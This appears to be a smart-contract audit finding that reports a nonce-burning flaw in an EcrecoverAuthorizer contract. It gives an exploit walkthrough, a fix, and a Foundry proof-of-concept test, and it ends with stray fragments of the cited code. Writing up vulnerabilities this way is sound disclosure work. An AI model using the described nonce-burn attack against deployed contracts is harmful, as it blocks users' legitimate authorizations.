### Title
Authorized-party nonce burn via delegated EcrecoverAuthorizer signature — (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any party already authorized by the `authorization.authorizer` in Midnight, not only from the authorizer themselves. Because the nonce is consumed on every successful call, an already-authorized attacker can sign and submit a self-referential authorization with the victim's current nonce, permanently burning any pending off-chain authorization the victim has already signed with that same nonce.

### Finding Description
**Code path** — `src/periphery/EcrecoverAuthorizer.sol` lines 24–48:

```solidity
function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
    require(block.timestamp <= authorization.deadline, Expired());
    require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce()); // nonce consumed here

    ...
    address signer = ecrecover(digest, signature.v, signature.r, signature.s);
    require(signer != address(0), InvalidSignature());
    require(
        signer == authorization.authorizer
            || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer), // ← delegation branch
        Unauthorized()
    );
    ...
}
``` [1](#0-0) 

**Root cause** — The `Unauthorized` guard at line 34 has two branches: the authorizer signs themselves, or any party already authorized by the authorizer in Midnight signs. The second branch lets an authorized party (`ATTACKER`) produce a valid EIP-712 signature over an `Authorization` struct where `authorizer = A`, consuming `nonce[A]` in the process.

**Exploit flow:**

| Step | Action |
|------|--------|
| 0 | A calls `midnight.setIsAuthorized(ecrecoverAuthorizer, true, A)` and `midnight.setIsAuthorized(ATTACKER, true, A)` — both are normal setup steps. |
| 1 | A signs off-chain: `Authorization{authorizer=A, authorized=LEGITIMATE_OPERATOR, isAuthorized=true, nonce=N}` and hands the signature to `LEGITIMATE_OPERATOR`. |
| 2 | ATTACKER signs: `Authorization{authorizer=A, authorized=ATTACKER, isAuthorized=true, nonce=N}` with ATTACKER's own private key. |
| 3 | ATTACKER calls `ecrecoverAuthorizer.setIsAuthorized(authAttacker, sigAttacker)`. |
| 4 | Line 26: `nonce[A]` advances from N → N+1. Line 34: `isAuthorized(A, ATTACKER) == true` → passes. Call succeeds. |
| 5 | `LEGITIMATE_OPERATOR` submits A's signed authorization → reverts `InvalidNonce` because `nonce[A]` is now N+1. |

**Why existing checks fail** — The `Unauthorized` check is satisfied by the delegation branch; it does not distinguish between "the authorizer is signing their own nonce" and "a delegate is consuming the authorizer's nonce." There is no guard preventing an authorized party from targeting `authorization.authorizer = A` with a nonce they did not generate. [2](#0-1) 

### Impact Explanation
A's off-chain signed authorization with nonce=N is permanently invalidated. `LEGITIMATE_OPERATOR` cannot submit it; A must re-sign with nonce=N+1 and redistribute the new signature. ATTACKER can repeat this indefinitely (each time signing a no-op self-authorization `isAuthorized=true` for themselves), making it impossible for A to successfully delegate to any third party through `EcrecoverAuthorizer` as long as ATTACKER remains authorized. A's only escape is to revoke ATTACKER's authorization via a direct on-chain call to `midnight.setIsAuthorized`, but ATTACKER can front-run that revocation with another nonce burn first.

### Likelihood Explanation
**Preconditions:**
1. A has authorized `ecrecoverAuthorizer` in Midnight (required for the contract to act on A's behalf — standard setup for any EcrecoverAuthorizer user).
2. A has authorized ATTACKER in Midnight at any prior point.
3. A has a pending off-chain signed authorization that ATTACKER knows about (e.g., via mempool observation or social engineering).

All three are realistic for any user who has ever granted authorization to a counterparty (e.g., a market maker, a keeper, or a liquidation bot). The attack is repeatable with zero cost beyond gas.

### Recommendation
Remove the delegation branch from the signer check in `EcrecoverAuthorizer`. Only the authorizer's own key should be able to consume the authorizer's nonce:

```solidity
// Before
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);

// After
require(signer == authorization.authorizer, Unauthorized());
```

The purpose of `EcrecoverAuthorizer` is to let a user prove their intent via their own private key without being online. Allowing delegates to sign on their behalf defeats this purpose and introduces the nonce-burn vector. Delegates who need to act on behalf of a user should call `midnight.setIsAuthorized` directly (they are already authorized to do so). [2](#0-1) 

### Proof of Concept
Foundry unit test to add to `test/SetIsAuthorizedWithSigTest.sol`:

```solidity
function testAuthorizedPartyBurnsVictimNonce() public {
    // Setup: borrower authorizes ecrecoverAuthorizer and attacker (otherBorrower) in Midnight
    vm.prank(borrower);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
    vm.prank(borrower);
    midnight.setIsAuthorized(otherBorrower, true, borrower); // attacker is authorized

    // Victim (borrower) signs Authorization{nonce=0, authorized=lender} off-chain
    Authorization memory victimAuth = makeAuthorization(borrower, lender, true);
    // nonce == 0 at this point
    Signature memory victimSig = signAuthorization(victimAuth, borrower);

    // Attacker signs Authorization{authorizer=borrower, authorized=attacker, nonce=0} with attacker's key
    Authorization memory attackerAuth = Authorization({
        authorizer: borrower,
        authorized: otherBorrower,
        isAuthorized: true,
        nonce: 0,
        deadline: vm.getBlockTimestamp() + 1 days
    });
    Signature memory attackerSig = signAuthorization(attackerAuth, otherBorrower);

    // Attacker submits first — consumes nonce 0
    ecrecoverAuthorizer.setIsAuthorized(attackerAuth, attackerSig);
    assertEq(ecrecoverAuthorizer.nonce(borrower), 1); // nonce burned

    // Victim's legitimate authorization now reverts
    vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
    ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);

    // lender was never authorized
    assertEq(midnight.isAuthorized(borrower, lender), false);
}
```

**Expected assertions:**
- `ecrecoverAuthorizer.nonce(borrower) == 1` after attacker's submission
- `ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig)` reverts with `InvalidNonce`
- `midnight.isAuthorized(borrower, lender) == false` [3](#0-2) [4](#0-3)

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        );

            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
